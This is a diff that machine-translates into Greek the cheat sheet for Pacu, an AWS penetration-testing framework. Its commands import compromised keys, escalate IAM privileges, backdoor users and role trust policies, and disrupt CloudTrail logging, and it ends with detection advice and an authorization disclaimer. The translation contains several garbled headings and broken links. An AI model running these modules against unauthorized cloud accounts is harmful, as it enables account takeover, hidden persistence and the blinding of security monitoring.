@@ -1,12 +1,16 @@
-# ☁️ Pacu — Πλήρης οδηγός αναφοράς
-
 <!-- language-home-navigation -->
-[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+No ️ Pacu - Πλήρες φύλλο εξαπάτησης
 
+[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
 ```
   ██████╗  █████╗  ██████╗██╗   ██╗
   ██╔══██╗██╔══██╗██╔════╝██║   ██║
@@ -16,7 +20,6 @@
   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
        The AWS Exploitation Framework by Rhino Security Labs
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
   <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Rhino Security Labs">
@@ -25,46 +28,45 @@
 </p>
 
 <p align="center">
-  <b>☁️ The open-source AWS exploitation framework designed for penetration testing cloud environments, privilege escalation, credential harvesting, and infrastructure reconnaissance</b>
+  <b>☁️ Το πλαίσιο εκμετάλλευσης AWS ανοιχτού κώδικα που έχει σχεδιαστεί για δοκιμές διείσδυσης σε περιβάλλοντα cloud, κλιμάκωση προνομίων, συλλογή διαπιστευτηρίων και αναγνώριση υποδομής</b>
 </p>
 
 ---
 
 ## 📋 Πίνακας περιεχομένων
 
-- [Εισαγωγή](#-overview--architecture)
-- [Εγκατάσταση](#-installation)
-- [Session Management & AWS Key Import](#-session-management--aws-key-import)
-  - [🔑 Session Management & AWS Key Import](#importing-compromised-credentials)
+- [Επισκόπηση & Αρχιτεκτονική](#-επισκόπηση--αρχιτεκτονική)
+- [Εγκατάσταση] (#-εγκατάσταση)
+- [Διαχείριση περιόδου σύνδεσης & Εισαγωγή κλειδιού AWS](#-session-management--aws-key-import)
+  - [Importing Compromised Credentials](#importing-compromised-credentials)
   - [Assumed Roles and Session Tokens](#assumed-roles-and-session-tokens)
-- [Reconnaissance & Enumeration Modules](#-reconnaissance--enumeration-modules)
+- [Ενότητες αναγνώρισης και απαρίθμησης](#-reconnaissance--enumeration-modules)
   - [Enumerating Current IAM Permissions](#enumerating-current-iam-permissions)
-  - [🔍 Reconnaissance & Enumeration Modules](#scanning-ec2-instances--s3-buckets)
-- [Privilege Escalation Techniques in AWS](#-privilege-escalation-techniques-in-aws)
-  - [Automatic Privilege Escalation Scanner](#automatic-privilege-escalation-scanner)
-  - [Executing Escalation Modules](#executing-escalation-modules)
-- [Persistence & Defense Evasion](#-persistence--defense-evasion)
+  - [Σάρωση EC2 Instances & S3 Buckets](#scanning-ec2-instances--s3-buckets)
+- [Τεχνικές κλιμάκωσης προνομίων στο AWS](#-privilege-escalation-techniques-in-aws)
+  - [Automatic Privilege Escalation Scanner] (#automatic-privilege-escalation-scanner)
+  - [Εκτέλεση μονάδων κλιμάκωσης](#executing-escalation-modules)
+- [Εμμονή και αμυντική αποφυγή](#-επιμονή--άμυνα-διαφυγή)
   - [Backdooring IAM Roles & Users](#backdooring-iam-roles--users)
-  - [Disrupting CloudTrail Logging](#disrupting-cloudtrail-logging)
-- [Γρήγορη αναφορά](#-quick-reference-table)
+  - [Διακοπή καταγραφής CloudTrail](#disrupting-cloudtrail-logging)
+- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
 - [Defensive Considerations & Detection](#-defensive-considerations--detection)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
 
 ---
 
-## 🎯 Εισαγωγή
+## 🎯 Επισκόπηση & Αρχιτεκτονική
 
-Created by **Rhino Security Labs**, **Pacu** is the "Metasploit for AWS". It is designed to emulate adversarial tactics within Amazon Web Services environments.
+Δημιουργήθηκε από τα **Rhino Security Labs**, το **Pacu** είναι το "Metasploit για AWS". Έχει σχεδιαστεί για να μιμείται τακτικές αντιπάλου μέσα σε περιβάλλοντα υπηρεσιών Web της Amazon.
 
-Pacu operates using a local SQLite database that maintains state across offensive sessions:
-- **Modular Pipeline**: Over 40 specialized modules covering discovery, lateral movement, privilege escalation, persistence, and exfiltration.
-- **Permission Enumeration**: Analyzes IAM policies without triggering alert thresholds by testing API actions or reviewing attached managed policies.
-- **Privesc Automation**: Evaluates known IAM permission escalation paths (such as `iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy`).
+Το Pacu λειτουργεί χρησιμοποιώντας μια τοπική βάση δεδομένων SQLite που διατηρεί κατάσταση σε όλες τις προσβλητικές περιόδους λειτουργίας:
+- **Modular Pipeline:** Πάνω από 40 εξειδικευμένες ενότητες που καλύπτουν την ανακάλυψη, την πλευρική κίνηση, την κλιμάκωση των προνομίων, την επιμονή και τη διήθηση.
+- **Απαρίθμηση αδειών:** Αναλύει τις πολιτικές IAM χωρίς να ενεργοποιεί όρια ειδοποίησης δοκιμάζοντας τις ενέργειες API ή εξετάζοντας τις συνημμένες διαχειριζόμενες πολιτικές.
+- **Privesc Automation:** Αξιολογεί γνωστές διαδρομές κλιμάκωσης αδειών IAM (όπως `iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy`).
 
 ---
 
 ## 📥 Εγκατάσταση
-
 ```bash
 # Clone the repository
 git clone https://github.com/RhinoSecurityLabs/pacu.git
@@ -78,18 +80,15 @@ pip install -r requirements.txt
 # Launch Pacu console
 python3 pacu.py
 ```
-
 ---
 
-## 🔑 Session Management & AWS Key Import
+## 🔑 Διαχείριση συνεδρίας & Εισαγωγή κλειδιού AWS
 
-When Pacu launches, you enter an interactive console. Create or select a session:
-
+Κατά την εκκίνηση του Pacu, μπαίνετε σε μια διαδραστική κονσόλα. Δημιουργία ή επιλογή συνεδρίας:
 ```text
 Pacu > set_session client_assessment
 ```
-
-### 🔑 Session Management & AWS Key Import
+### Εισαγωγή παραβιασμένων διαπιστευτηρίων
 ```text
 Pacu (client_assessment) > set_keys
 Enter Key Alias: compromised_dev
@@ -98,26 +97,23 @@ Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 Enter AWS Session Token (Optional): 
 Enter Default Region: us-east-1
 ```
-
-### Assumed Roles and Session Tokens
+### Υποτιθέμενοι ρόλοι και διακριτικά συνεδρίας
 ```text
 # Switch active keys within the session
 Pacu (client_assessment) > swap_keys
 ```
-
 ---
 
-## 🔍 Reconnaissance & Enumeration Modules
+## 🔍 Ενότητες αναγνώρισης και απαρίθμησης
 
-### Enumerating Current IAM Permissions
-Determine who you are and what the active credentials are permitted to do:
+### Αριθμώντας τρέχοντα δικαιώματα IAM
+Προσδιορίστε ποιος είστε και τι επιτρέπεται να κάνουν τα ενεργά διαπιστευτήρια:
 ```text
 # Query caller identity and enumerate attached user/group/role policies
 Pacu (client_assessment) > run iam__enum_permissions
 Pacu (client_assessment) > whoami
 ```
-
-### 🔍 Reconnaissance & Enumeration Modules
+### Σάρωση EC2 Instances & S3 Buckets
 ```text
 # Enumerate all EC2 instances and security groups
 Pacu (client_assessment) > run ec2__enum
@@ -125,21 +121,20 @@ Pacu (client_assessment) > run ec2__enum
 # Enumerate accessible S3 buckets and identify public read/write permissions
 Pacu (client_assessment) > run s3__enum
 ```
-
 ---
 
-## ⚡ Privilege Escalation Techniques in AWS
+## ⚡ Τεχνικές κλιμάκωσης προνομίων στο AWS
 
-AWS privilege escalation relies on misconfigured IAM policies that permit non-administrative users to grant themselves or other entities administrative rights.
+Η κλιμάκωση των προνομίων του AWS βασίζεται σε κακώς διαμορφωμένες πολιτικές IAM που επιτρέπουν στους μη διαχειριστικούς χρήστες να εκχωρούν δικαιώματα διαχείρισης στον εαυτό τους ή σε άλλες οντότητες.
 
-### Automatic Privilege Escalation Scanner
-Scans your enumerated permissions against 21+ documented AWS privesc vectors:
+### Αυτόματος σαρωτής κλιμάκωσης προνομίων
+Σαρώνει τα απαριθμημένα άδειά σας σε σχέση με 21+ τεκμηριωμένα διανύσματα AWS privesc:
 ```text
 Pacu (client_assessment) > run iam__privesc_scan
 ```
-*Sample output highlights vulnerable permissions like `iam:PutUserPolicy`, `iam:AttachUserPolicy`, or `iam:CreateAccessKey`.*
+*Το δείγμα εξόδου επισημαίνει ευάλωτα δικαιώματα όπως τα `iam:PutUserPolicy`, `iam:AttachUserPolicy` ή `iam:CreateAccessKey`.*
 
-### Executing Escalation Modules
+### Εκτέλεση μονάδων κλιμάκωσης
 ```text
 # Exploit iam:AttachUserPolicy to attach AdministratorAccess
 Pacu (client_assessment) > run iam__privesc_scan --exec
@@ -147,10 +142,9 @@ Pacu (client_assessment) > run iam__privesc_scan --exec
 # Exploit iam:CreateAccessKey to create keys for another high-priv user
 Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
 ```
-
 ---
 
-## 🛡️ Persistence & Defense Evasion
+## 🛡️ Επιμονή & Αμυντική Αποφυγή
 
 ### Backdooring IAM Roles & Users
 ```text
@@ -160,8 +154,7 @@ Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_servic
 # Modify assume-role trust policy to allow external account access
 Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
 ```
-
-### Disrupting CloudTrail Logging
+### Διακοπή καταγραφής CloudTrail
 ```text
 # Identify CloudTrail trails
 Pacu (client_assessment) > run cloudtrail__enum
@@ -169,33 +162,32 @@ Pacu (client_assessment) > run cloudtrail__enum
 # Stop logging on active trails to blind SOC monitors
 Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
 ```
+---
+
+## ⚡ Γρήγορος Πίνακας Αναφοράς
+
+| Στόχος | Εντολή Pacu |
+|-----------|---------------|
+| **Ορισμός/Επιλογή συνεδρίας** | `set_session <NAME>` |
+| **Εισαγωγή διαπιστευτηρίων AWS** | `set_keys` |
+| **Εμφάνιση τρέχουσας ταυτότητας** | `whoami` |
+| **Αριθμήστε τα δικαιώματα IAM** | `run iam__enum_permissions` |
+| **Σάρωση για Privesc Vectors** | `run iam__privesc_scan` |
+| **Αριθμήστε S3 Buckets** | `run s3__enum` |
+| **Αριθμήστε περιπτώσεις EC2** | `run ec2__enum` |
+| **Διατάραξη του CloudTrail** | `run cloudtrail__disrupt_logging` |
+| **Κατάλογος Διαθέσιμων Ενοτήτων** | `list` |
 
 ---
 
-## ⚡ Γρήγορη αναφορά
+## 🛡️ Αμυντικές Θεωρήσεις & Ανίχνευση
 
-|Objective|Pacu Command|
-|-----------|--------------|
-|**Set/Select Session**|`set_session <NAME>`|
-|**Import AWS Credentials**|`set_keys`|
-|**Show Current Identity**|`whoami`|
-|**Enumerate IAM Rights**|`run iam__enum_permissions`|
-|**Scan for Privesc Vectors**|`run iam__privesc_scan`|
-|**Enumerate S3 Buckets**|`run s3__enum`|
-|**Enumerate EC2 Instances**|`run ec2__enum`|
-|**Disrupt CloudTrail**|`run cloudtrail__disrupt_logging`|
-|**List Available Modules**|`list`|
+1. **GuardDuty & CloudTrail Monitoring:** Η αυτοματοποιημένη κλιμάκωση προνομίων και η σάρωση αδειών της Pacu δημιουργούν γρήγορα διαδοχικά ερωτήματα API που επισημαίνονται εύκολα από το AWS GuardDuty.
+2. **SCP & Όρια αδειών:** Επιβολή Πολιτικών Ελέγχου Υπηρεσίας Οργανισμών AWS (SCP) αποτρέποντας οποιονδήποτε κύριο—συμπεριλαμβανομένων των πλήρους διαχειριστών— από την παραβίαση του CloudTrail ή την τροποποίηση δομών ριζικού οργανισμού.
 
 ---
 
-## 🛡️ Defensive Considerations & Detection
+## ⚠️ Νομική αποποίηση ευθύνης
 
-1. **GuardDuty & CloudTrail Monitoring:** Pacu's automated privilege escalation and permission scanning generate rapid sequential API queries easily flagged by AWS GuardDuty.
-2. **SCP & Permission Boundaries:** Enforce AWS Organizations Service Control Policies (SCPs) preventing any principal—including full Admins—from tampering with CloudTrail or modifying root organization structures.
-
----
-
-## ⚠️ Legal Disclaimer
-
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> Pacu is designed specifically for authorized AWS penetration tests and security evaluations. Testing cloud accounts without explicit prior permission from the asset owner violates Amazon Web Services Acceptable Use Policy and international law.
+> [!ΠΡΟΣΟΧΗ]
+> Το Pacu έχει σχεδιαστεί ειδικά για εξουσιοδοτημένες δοκιμές διείσδυσης AWS και αξιολογήσεις ασφάλειας. Η δοκιμή λογαριασμών cloud χωρίς ρητή προηγούμενη άδεια από τον κάτοχο του στοιχείου παραβιάζει την Πολιτική Αποδεκτής Χρήσης Υπηρεσιών Ιστού της Amazon και το διεθνές δίκαιο.
